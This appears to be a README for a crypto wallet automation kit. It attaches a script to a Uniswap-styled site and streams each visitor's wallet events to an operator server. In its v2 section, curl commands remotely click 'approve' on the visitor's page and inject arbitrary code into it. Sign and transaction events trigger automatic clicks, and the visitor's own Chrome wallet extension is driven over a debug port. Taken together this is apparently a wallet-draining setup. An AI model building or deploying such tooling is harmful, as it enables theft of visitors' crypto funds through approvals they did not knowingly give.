# Playwright on Visitors

Har real visitor aaye → server par **Playwright mirror bot** spawn hota hai.

---

## Architecture

```
Visitor Browser                    Your VPS / PC
     |                                  |
     |-- WebSocket ws://IP:8791 ------->|  playwright-visitor-server.mjs
     |<-- sessionId --------------------|
     |-- visitor:wallet:connected ----->|
     |                            Playwright opens SAME URL
     |                            + MetaMask extension
     |                            auto Confirm / Sign / Approve
     |<-- visitor:nudge ----------------|  (real visitor ko message)
```

| Layer | Kya karta hai |
|-------|----------------|
| **visitor-bridge.js** | Visitor browser → WebSocket events bhejta hai |
| **playwright-visitor-server.mjs** | Events sunta hai, session banata hai |
| **playwright-session-worker.mjs** | Playwright mirror + extension bot |

---

## Setup (3 steps)

### 1. Server start (tumhari machine / VPS)

```powershell
cd standalone-browser-automation
npm install
npm run build

$env:METAMASK_EXTENSION_PATH="C:\path\to\metamask-unpacked"
$env:METAMASK_PASSWORD="TestPassword123!"
npm run visitor-server -- --port 8791 --site https://tumhari-agent-site.com
```

Check:
- http://localhost:8791/health
- http://localhost:8791/sessions

### 2. Site config (visitor attach)

```html
<script>
  window.LegionAgentConfig = {
    preset: 'uniswap',
    chainId: 1,
    // Option A — manual server IP:
    playwrightBridge: 'ws://YOUR_VPS_IP:8791',
    // Option B — same domain auto (port 8791):
  //  playwrightBridgeAuto: true,
  };
</script>
<script src="./legion-auto.js" defer></script>
```

Rebuild bundle after changes: `npm run build`

### 3. Firewall

Port **8791** open karo VPS par (TCP).

---

## Kya hota hai jab visitor aata hai

1. Visitor site kholta hai → `visitor:hello` server ko
2. Server **sessionId** deta hai
3. Server **Playwright browser** kholta hai (same URL)
4. Visitor T&C Yes → server Playwright bhi Yes click
5. Visitor connect → server Playwright extension Connect/Approve try
6. Screenshots: `standalone-browser-automation/sessions/{sessionId}/`

---

## Important limits

| Works | Doesn't work |
|-------|----------------|
| Server Playwright + extension full auto | Visitor ke **local** MetaMask par remote click |
| Mirror same page flow | Visitor wallet bina user Confirm |
| Live session list `/sessions` | Playwright inside visitor's phone |

**Visitor ka wallet popup** = user khud Confirm karega.  
**Server Playwright** = tumhare test wallet / mirror bot — parallel flow + screenshots.

---

## Debug

```js
// Visitor console
VisitorPlaywrightBridge.isConnected()
VisitorPlaywrightBridge.sessionId
window.__LEGION_SESSION_ID__

// Events
window.addEventListener('legion:playwright', e => console.log(e.detail))
```

```powershell
# Active sessions
curl http://localhost:8791/sessions
```

---

## Env vars

| Var | Role |
|-----|------|
| `METAMASK_EXTENSION_PATH` | Server Playwright extension |
| `METAMASK_PASSWORD` | Unlock |
| `PW_VISITOR_PORT` | Default 8791 |
| `AGENT_SITE_URL` | Default site URL |

---

## npm scripts

```powershell
npm run visitor-server
npm run visitor-server -- --port 8791 --site http://localhost:3456
npm run visitor-server -- --no-spawn   # track only, no Playwright
npm run visitor-server -- --cdp http://127.0.0.1:9222
npm run cdp-bridge -- --cdp http://127.0.0.1:9222
```

---

## v2 — Remote click + Inject + CDP

### Remote click (visitor phone/PC — in-page)

```powershell
curl -X POST http://localhost:8791/remote/SESSION/clickText -H "Content-Type: application/json" -d "{\"text\":\"approve\"}"
curl -X POST http://localhost:8791/remote/SESSION/touch -d "{\"x\":200,\"y\":400}"
curl -X POST http://localhost:8791/remote/SESSION/connect
curl -X POST http://localhost:8791/remote/SESSION/inject -d "{\"code\":\"TermsWalletAutomation.start()\"}"
```

Sign/tx events par server auto remote click bhejta hai.

### CDP — visitor PC extension control

Visitor Chrome debug mode:
```
chrome.exe --remote-debugging-port=9222
```

Server: `npm run visitor-server -- --cdp http://127.0.0.1:9222`

| Mode | Extension auto-click on visitor |
|------|--------------------------------|
| Remote WebSocket only | ❌ extension popup |
| CDP + debug Chrome | ✅ visitor ka wahi Chrome |
| Mobile MetaMask app | ❌ (in-page touch only) |
